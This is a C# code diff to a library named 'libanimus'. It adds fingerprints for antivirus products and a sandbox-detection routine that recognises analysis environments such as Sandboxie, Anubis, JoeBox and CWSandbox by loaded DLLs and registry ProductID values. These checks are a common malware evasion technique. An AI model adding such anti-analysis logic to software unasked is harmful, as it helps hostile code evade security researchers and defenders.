@@ -11,7 +11,9 @@ namespace libanimus
 		const string SECURITY_CENTER_NT5	= "rootSecurityCenter";
 		const string SECURITY_CENTER_NT6	= "rootSecurityCenter2";
 		const string WIN32_COMPUTER_SYSTEM	= "Win32_ComputerSystem";
+		const string CURRENTVERSION			= "SOFTWARE\\Microsoft Windows\\NT\\CurrentVersion";
 		static VMInfo cached_vm;
+		static SandboxInfo[] cached_sandboxes;
 
 		/// <summary>
 		/// Information about VM manufacturers and models.
@@ -34,7 +36,23 @@ namespace libanimus
 		readonly static AVInfo[] AV_Information = {
 			new AVInfo (company: "ESET", path: "ESET", generic: true),
 			new AVInfo (company: "ESET", path: "ESET\\ESET NOD32 Antivirus", name: "ESET NOD32 Antivirus"),
+			new AVInfo (company: "Avast Software", path: "AVAST Software", generic: true),
 			new AVInfo (company: "Avast Software", path: "AVAST Software\\Avast", name: "Avast"),
+			new AVInfo (company: "AVG", path: "AVG", generic: true),
+			new AVInfo (company: "AVG", path: "AVG\\AVG2015\\", name: "AVG Antivirus"),
+			new AVInfo (company: "Malwarebytes", path: "Malwarebytes Anti-Malware", name: "Malwarebytes Anti-Malware"),
+			new AVInfo (company: "Avira", path: "Avira", generic: true),
+		};
+
+		/// <summary>
+		/// Information about sandboxes.
+		/// </summary>
+		readonly static SandboxInfo[] Sandbox_Information = {
+			new SandboxInfo ("Sandboxie", module: "SbieDll.dll"),
+			new SandboxInfo ("ThreatExpert", module: "dbghelp.dll"),
+			new SandboxInfo ("Anubis2", regKey: CURRENTVERSION, regValue: "ProductID", regEquals: "76487-337-8429955-22614"),
+			new SandboxInfo ("JoeBox", regKey: CURRENTVERSION, regValue: "ProductID", regEquals: "55274-640-2673064-23950"),
+			new SandboxInfo ("CWSandbox", regKey: CURRENTVERSION, regValue: "ProductID", regEquals: "76487-644-3177037-23510"),
 		};
 
 		/// <summary>
@@ -49,7 +67,10 @@ namespace libanimus
 					? manual.Where (av => !(av.Company == company && av.Generic)).ToArray ()
 					: manual;
 			}
-			return auto.Concat (manual.Select (av => av.Name)).ToArray ();
+			return auto.Concat (manual
+				.Select (av => av.Generic
+					? string.Format ("{0} {1}", av.Company, av.Name)
+					: av.Name)).ToArray ();
 		}
 
 		/// <summary>
@@ -87,6 +108,19 @@ namespace libanimus
 			if (cached_vm == null)
 				IsVM ();
 			return cached_vm == null ? "Unknown" : cached_vm.Name;
+		}
+
+		public static bool IsSandbox () {
+			var sandboxes = Sandbox_Information.Where (sandbox => sandbox.IsMatch ());
+			cached_sandboxes = sandboxes == null ? null : sandboxes.ToArray ();
+			cached_sandboxes = cached_sandboxes != null ? cached_sandboxes.Length == 0 ? null : cached_sandboxes : cached_sandboxes;
+			return cached_sandboxes != null;
+		}
+
+		public static string[] GetSandboxNames () {
+			if (cached_sandboxes == null)
+				IsSandbox ();
+			return cached_sandboxes == null ? new [] { "Unknown" } : cached_sandboxes.Select (sandbox => sandbox.Name).ToArray ();
 		}
 
 		/// <summary>
